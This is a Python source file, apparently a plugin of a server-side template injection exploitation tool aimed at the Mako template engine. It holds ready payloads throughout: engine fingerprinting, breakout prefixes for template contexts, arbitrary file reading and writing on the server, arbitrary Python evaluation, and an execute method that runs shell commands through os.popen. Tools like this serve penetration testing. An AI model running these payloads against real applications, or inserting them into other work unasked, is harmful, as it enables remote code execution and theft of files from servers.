from core import closures
from core.plugin import Plugin
from utils.strings import quote, chunkit, md5
from utils.loggers import log
from utils import rand


class Mako(Plugin):

    actions = {
        'render' : {
            'payload': '${%(payload)s}',
            'header': '${%(header)s}',
            'trailer': '${%(trailer)s}'
        },
        'write' : {
            'call' : 'evaluate',
            'write' : """open("%(path)s", 'ab+').write(__import__("base64").urlsafe_b64decode('%(chunk)s'))""",
            'truncate' : """open("%(path)s", 'w').close()"""
        },
        'read' : {
            'call': 'inject',
            'read' : """<%% x=__import__("base64").b64encode(open("%(path)s", "rb").read()) %%>${x}"""
        },
        'md5' : {
            'call': 'inject',
            'md5': """<%% x=__import__("hashlib").md5(open("%(path)s", 'rb').read()).hexdigest() %%>${x}"""
        },
        'evaluate' : {
            'call': 'inject',
            'evaluate': '<%% %(code)s %%>'
        }

    }

    contexts = [

        # Text context, no closures
        { 'level': 1 },

        # Normal reflecting tag ${}
        { 'level': 1, 'prefix': '%(closure)s}', 'suffix' : '', 'closures' : closures.python_ctx_closures },

        # Code blocks
        # This covers <% %s %>, <%! %s %>, <% %s=1 %>
        { 'level': 1, 'prefix': '%(closure)s%%>', 'suffix' : '<%%#', 'closures' : closures.python_ctx_closures },

        # If and for blocks
        # % if %s:\n% endif
        # % for a in %s:\n% endfor
        { 'level': 5, 'prefix': '%(closure)s#\n', 'suffix' : '\n', 'closures' : closures.python_ctx_closures },

        # Mako blocks
        { 'level': 5, 'prefix' : '</%%doc>', 'suffix' : '<%%doc>' },
        { 'level': 5, 'prefix' : '</%%def>', 'suffix' : '<%%def name="t(x)">', 'closures' : closures.python_ctx_closures },
        { 'level': 5, 'prefix' : '</%%block>', 'suffix' : '<%%block>', 'closures' : closures.python_ctx_closures },
        { 'level': 5, 'prefix' : '</%%text>', 'suffix' : '<%%text>', 'closures' : closures.python_ctx_closures},

    ]

    def detect_engine(self):

        randA = rand.randstr_n(2)
        randB = rand.randstr_n(2)

        payload = '${"%s".join("%s")}' % (randA, randB)
        expected = randA.join(randB)

        if expected == self.inject(payload):
            self.set('language', 'python')
            self.set('engine', 'mako')
            self.set('eval', 'python')

    def detect_eval(self):

        # Check eval capabilities only if engine has been found
        if not self.get('engine'):
            return

        payload = """<% import sys, os; x=os.name; y=sys.platform; %>${x}-${y}"""
        self.set('eval', 'python')
        self.set('os', self.inject(payload))

    def execute(self, command):

        return self.inject("""<%% import os; x=os.popen("%s").read() %%>${x}""" % (quote(command)))
